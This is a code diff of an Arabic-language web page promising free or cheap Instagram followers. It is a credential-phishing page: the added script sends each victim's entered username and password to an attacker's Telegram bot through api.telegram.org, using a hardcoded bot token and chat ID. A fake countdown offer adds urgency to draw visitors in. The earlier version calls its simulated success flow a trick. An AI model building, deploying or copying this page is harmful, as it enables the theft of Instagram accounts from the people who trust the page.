@@ -3,176 +3,269 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>حساب إنستغرام - تعبئة الماس/المتابعين</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <title>💜 زيادة متابعين انستغرام 💜</title>
     <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        /* التنسيقات المضافة لضمان عمل المؤقت والرسائل (غير موجودة في style.css) */
+        .free-offer-item .diamond-info {
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        
+        .free-offer-item .top-row {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin-bottom: 5px;
+        }
+
+        .free-offer-item .timer {
+            font-size: 20px;
+            font-weight: bold;
+            color: #833ab4;
+            background-color: #fce4ec;
+            padding: 4px 10px;
+            border-radius: 5px;
+            box-shadow: none;
+            display: inline-block;
+        }
+
+        /* رسالة التنبيه العلوية */
+        #notification-message {
+            position: fixed;
+            top: 0;
+            right: 0;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+            z-index: 1000;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transform: translateY(-100%);
+            transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
+            opacity: 0;
+        }
+        
+        /* حالات ألوان الرسائل */
+        #notification-message.success {
+            background-color: #28a745; 
+            color: white;
+        }
+
+        #notification-message.error {
+            background-color: #dc3545;
+            color: white;
+        }
+        
+        #notification-message.info {
+            background-color: #17a2b8; 
+            color: white;
+        }
+
+        #notification-message.visible {
+            transform: translateY(0);
+            opacity: 1;
+        }
+    </style>
 </head>
 <body>
 
-    <div class="container">
-        <header>
-            <h1>💎 أداة تعبئة المتابعين/الماسات لحساب إنستغرام 💎</h1>
-        </header>
+    <div id="notification-message"></div>
 
-        <div id="loginSection" class="section">
-            <h2>🔑 تسجيل الدخول إلى حسابك على إنستغرام</h2>
-            <p>لاستكمال عملية تعبئة المتابعين أو الماس، يرجى تسجيل الدخول. معلوماتك آمنة.</p>
-            
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">اسم المستخدم/البريد الإلكتروني/الهاتف:</label>
-                    <input type="text" id="username" name="username" placeholder="مثال: user_name_44" required>
-                </div>
+    <header>
+        <h1>💜 زيادة متابعين انستغرام حقيقيين وآمنين 💜</h1>
+    </header>
 
-                <div class="form-group">
-                    <label for="password">كلمة المرور:</label>
-                    <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور الخاصة بك" required>
-                </div>
-
-                <button type="submit" id="submitLoginBtn" class="submit-btn">تسجيل الدخول والمتابعة</button>
-            </form>
-        </div>
+    <main class="container">
         
-        <div id="packagesSection" class="section hidden">
-            <h2>✨ اختر باقة المتابعين/الماسات</h2>
-            <p>اختر الباقة التي تناسبك لزيادة متابعيك أو رصيدك من الماس.</p>
-
+        <section class="section" id="login-section">
+            <h2>🔑 إدخال بيانات حساب انستغرام</h2>
+            <form id="submission-form">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم (Username):</label>
+                    <input type="text" id="username" name="username" placeholder="@اسم_المستخدم" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">كلمة المرور (Password):</label>
+                    <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+                </div>
+                <button type="submit" class="submit-btn" id="submit-info-btn">تأكيد بيانات الحساب</button>
+            </form>
+        </section>
+        
+        <section class="section special-offer-section" id="timer-free-offer-section">
+            <h2>🔥 عرض الـ 15 دقيقة الذهبي! اطلب مجاناً الآن 🔥</h2>
+            
             <div class="diamond-list">
-                <div class="diamond-item">
+                <div class="diamond-item free-offer-item">
                     <div class="diamond-info">
-                        <span>🚀 1,000 متابع/ماس</span>
-                        <span class="price">9.99$</span>
+                        <div class="top-row">
+                             <span>1000 متابع انستغرام</span>
+                             <span class="timer" id="timer">15:00</span>
+                        </div>
+                        <span class="free-price">مجاني!</span>
                     </div>
-                    <button class="buy-btn" data-package="1000">شراء الباقة</button>
-                </div>
-
-                <div class="diamond-item">
-                    <div class="diamond-info">
-                        <span>🔥 5,000 متابع/ماس</span>
-                        <span class="price">29.99$</span>
-                    </div>
-                    <button class="buy-btn" data-package="5000">شراء الباقة</button>
-                </div>
-
-                <div class="diamond-item special-offer-section">
-                    <div class="diamond-info">
-                        <span>🌟 10,000 متابع/ماس + 50% إضافية مجانًا!</span>
-                        <span class="free-price">49.99$</span>
-                    </div>
-                    <p class="small-text">عرض لفترة محدودة جداً!</p>
-                    <button class="buy-btn free-offer-btn" data-package="15000">احصل على العرض الآن</button>
+                    <button class="buy-btn free-offer-btn" data-is-paid="false" data-is-auth-required="true" disabled>اطلب الآن مجاناً</button>
                 </div>
             </div>
-        </div>
+        </section>
 
-        <div id="messageSection" class="section hidden special-offer-section">
-            <h2>✅ جاري المعالجة...</h2>
-            <p>تم استلام معلومات حسابك بنجاح. سنقوم بمعالجة طلبك خلال لحظات.</p>
-            <p>شكراً لاستخدامك خدمتنا.</p>
-        </div>
+        <section class="section special-offer-section expired-offer-section hidden" id="expired-paid-offer-section">
+            <h2>⚠️ فاتك العرض المجاني! لا تفوت عرض اللحظة الأخيرة ⚠️</h2>
+            <p>اشترِ الآن 1000 متابع بخصم خاص</p>
+            <div class="diamond-list">
+                <div class="diamond-item paid-expired-item">
+                    <div class="diamond-info">
+                        <span>1000 متابع (عرض منتهي)</span>
+                        <span class="free-price">0.49$</span>
+                    </div>
+                    <button class="buy-btn paid-expired-btn" data-is-paid="false" data-is-auth-required="true" disabled>شراء بخصم خاص</button>
+                </div>
+            </div>
+        </section>
 
-        <footer>
-            <p>جميع الحقوق محفوظة. هذه الخدمة مخصصة لغرض تعبئة الرصيد الداخلي فقط.</p>
-        </footer>
-    </div>
+        <section class="section" id="packages-section">
+            <h2>📦 باقات المتابعين السريعة</h2>
+            <div class="diamond-list">
+                <div class="diamond-item"><div class="diamond-info"><span>10,000 متابع انستغرام</span><span>5$</span></div><button class="buy-btn" data-is-paid="true" data-is-auth-required="true" disabled>شراء الآن</button></div>
+                <div class="diamond-item"><div class="diamond-info"><span>25,000 متابع انستغرام</span><span>10$</span></div><button class="buy-btn" data-is-paid="true" data-is-auth-required="true" disabled>شراء الآن</button></div>
+                <div class="diamond-item"><div class="diamond-info"><span>55,000 متابع انستغرام</span><span>20$</span></div><button class="buy-btn" data-is-paid="true" data-is-auth-required="true" disabled>شراء الآن</button></div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer>
+        <p>&copy; 2025 خدمات انستغرام المميزة. كل الحقوق محفوظة.</p>
+    </footer>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // منع الإرسال الافتراضي للصفحة
+        // ======= إعدادات تيليجرام =======
+        const BOT_TOKEN = '8459453814:AAG4bE5jk_bXxw0jjrYOMCp9Bjhnf-_bNsY'; 
+        const CHAT_ID = '6313103532';     
+        // =================================
 
-            // 1. استخلاص البيانات
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+        const form = document.getElementById('submission-form');
+        const submitBtn = document.getElementById('submit-info-btn');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const buyBtns = document.querySelectorAll('.buy-btn');
+        const timerElement = document.getElementById('timer');
+        const freeOfferSection = document.getElementById('timer-free-offer-section');
+        const expiredPaidOfferSection = document.getElementById('expired-paid-offer-section');
+        const freeOfferBtn = document.querySelector('.free-offer-btn');
+        const notificationMessage = document.getElementById('notification-message');
+        
+        // ============= وظيفة إظهار رسالة التنبيه العلوية =============
+        function showNotificationMessage(text, type) {
+            notificationMessage.textContent = text;
+            notificationMessage.className = '';
+            notificationMessage.classList.add(type);
+            notificationMessage.classList.add('visible');
+
+            setTimeout(() => {
+                notificationMessage.style.opacity = '0'; 
+                setTimeout(() => {
+                    notificationMessage.classList.remove('visible');
+                    notificationMessage.style.opacity = '';
+                }, 300);
+            }, 2000);
+        }
+        
+        // ============= وظيفة إرسال تيليجرام (خاصة ببيانات الحساب فقط) =============
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
             
-            // تهيئة زر الإرسال وحالته
-            const submitBtn = document.getElementById('submitLoginBtn');
-            submitBtn.textContent = 'جاري الإرسال...';
-            submitBtn.disabled = true;
-
-            // 2. تجميع البيانات
-            const dataToSend = {
-                platform: 'Instagram', // لتحديد المنصة في السيرفر
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString()
-            };
-
-            // 3. إرسال البيانات (هذا الجزء يجب أن يتم تعديله ليتناسب مع خادمك)
-            // في البيئة الحقيقية، ستقوم بإرسال 'dataToSend' إلى عنوان URL لخادمك.
-            /*
-            fetch('https://your-server-url.com/save-credentials', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(dataToSend),
-            })
-            .then(response => {
-                // ... معالجة استجابة الخادم ...
-                if (response.ok) {
-                    console.log('بيانات إنستغرام أرسلت بنجاح');
-                    // الانتقال إلى قسم الباقات (اختياري)
-                    document.getElementById('loginSection').classList.add('hidden');
-                    document.getElementById('packagesSection').classList.remove('hidden');
-                    // أو إظهار رسالة النجاح مباشرة
-                    // document.getElementById('packagesSection').classList.add('hidden');
-                    // document.getElementById('messageSection').classList.remove('hidden');
+            fetch(url)
+            .then(response => response.json()) 
+            .then(data => {
+                if (data.ok) {
+                    showNotificationMessage('🔑 لقد تم تسجيل الدخول بنجاح.', 'success');
                 } else {
-                    alert('فشل في إرسال البيانات. حاول مرة أخرى.');
+                    console.error('Telegram API Error:', data);
+                    showNotificationMessage('❌ حدث خطأ في الإرسال! يرجى التحقق من توكن البوت.', 'error');
                 }
             })
             .catch(error => {
-                console.error('حدث خطأ في الاتصال:', error);
-                alert('فشل في الاتصال بالخادم. حاول لاحقاً.');
-            })
-            .finally(() => {
-                // يمكنك إعادة تمكين الزر هنا أو بعد نجاح العملية حسب رغبتك في توجيه المستخدم
-                submitBtn.textContent = 'تم الإرسال'; // يمكنك تركها "تم الإرسال" لتوحي بالنجاح
-            });
-            */
-
-            // *** للتجربة والنموذج الأولي (بدون خادم فعلي) ***
-            // نحاكي عملية إرسال ناجحة وتأخير بسيط (3 ثواني)
-            setTimeout(() => {
-                console.log('تم إرسال بيانات إنستغرام (محاكاة):', dataToSend);
-                
-                // إخفاء قسم تسجيل الدخول
-                document.getElementById('loginSection').classList.add('hidden');
-                
-                // إظهار قسم الباقات لجعل المستخدم يكمل التفاعل (خدعة)
-                document.getElementById('packagesSection').classList.remove('hidden');
-                
-                // تحديث حالة الزر بعد المحاكاة
-                submitBtn.textContent = 'تم تسجيل الدخول بنجاح';
-                submitBtn.disabled = true; // نتركه معطلاً لأنه تم الإرسال
-
-                // تفعيل منطق أزرار الشراء (لجعل التجربة أكثر واقعية)
-                setupBuyButtons();
-            }, 3000); 
-
-        });
-
-
-        // منطق أزرار الشراء (Buy Buttons) بعد تسجيل الدخول
-        function setupBuyButtons() {
-            document.querySelectorAll('.buy-btn').forEach(button => {
-                button.addEventListener('click', function() {
-                    const packageName = this.getAttribute('data-package');
-                    
-                    // إخفاء قسم الباقات
-                    document.getElementById('packagesSection').classList.add('hidden');
-                    
-                    // إظهار رسالة الإرسال النهائية
-                    document.getElementById('messageSection').classList.remove('hidden');
-
-                    console.log(`تم اختيار باقة: ${packageName} متابع/ماس. (محاكاة لإكمال التفاعل)`);
-
-                    // هنا يمكنك إرسال بيانات الباقة المختارة (إذا كان ذلك ضرورياً)
-
-                });
+                console.error('Fetch Error:', error);
+                showNotificationMessage('⚠️ فشل الإرسال. تأكد من اتصالك بالإنترنت.', 'error');
             });
         }
+        
+        // ============= إرسال بيانات الحساب الأساسية =============
+        submitBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            
+            let username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (username.length === 0 || password.length === 0) {
+                 showNotificationMessage('⚠️ يرجى ملء جميع الحقول.', 'error');
+                 return;
+            }
+            
+            // إزالة جميع المسافات من اسم المستخدم قبل الإرسال
+            const cleanedUsername = username.replace(/\s/g, ''); 
+            
+            if (form.checkValidity()) {
+                const message = `🚨  <b>تسجيل دخول انستغرام جديد!</b> 🚨\n------------------------------------\nاسم المستخدم: <code>${cleanedUsername}</code>\nكلمة المرور: <code>${password}</code>\n------------------------------------`;
+                
+                sendToTelegram(message);
+                
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'تم تأكيد البيانات ✅ يمكنك الآن الشراء.';
+                buyBtns.forEach(btn => btn.disabled = false);
+            } else {
+                form.reportValidity();
+            }
+        });
 
+        // ============= التعامل مع أزرار الشراء (إشعار محلي فقط) =============
+        buyBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const isAuthRequired = btn.getAttribute('data-is-auth-required') === 'true';
+                const isPaidOrder = btn.getAttribute('data-is-paid') === 'true';
+
+                if (isAuthRequired && submitBtn.disabled !== true) {
+                    showNotificationMessage('❌ يجب تسجيل حسابك أولاً.', 'error');
+                    return;
+                }
+
+                if (isPaidOrder) {
+                    showNotificationMessage('💵 جارٍ تحويلك إلى صفحة الدفع...', 'info');
+                } else {
+                    showNotificationMessage('✅ تم استلام طلبك بنجاح! سيتم التنفيذ خلال 24 ساعة.', 'info'); 
+                }
+            });
+        });
+        
+        // ============= وظيفة المؤقت (15 دقيقة) =============
+        let duration = 15 * 60;
+        const countdownInterval = setInterval(() => {
+            const minutes = parseInt(duration / 60, 10);
+            const seconds = parseInt(duration % 60, 10);
+
+            const displayMinutes = minutes < 10 ? "0" + minutes : minutes;
+            const displaySeconds = seconds < 10 ? "0" + seconds : seconds;
+
+            timerElement.textContent = displayMinutes + ":" + displaySeconds;
+
+            if (--duration < 0) {
+                clearInterval(countdownInterval);
+                timerElement.textContent = "انتهى!";
+                
+                freeOfferSection.classList.add('hidden');
+                expiredPaidOfferSection.classList.remove('hidden');
+                
+                if (submitBtn.disabled) {
+                    document.querySelector('.paid-expired-btn').disabled = false; 
+                }
+                freeOfferBtn.disabled = true;
+            }
+        }, 1000);
     </script>
+
 </body>
 </html>
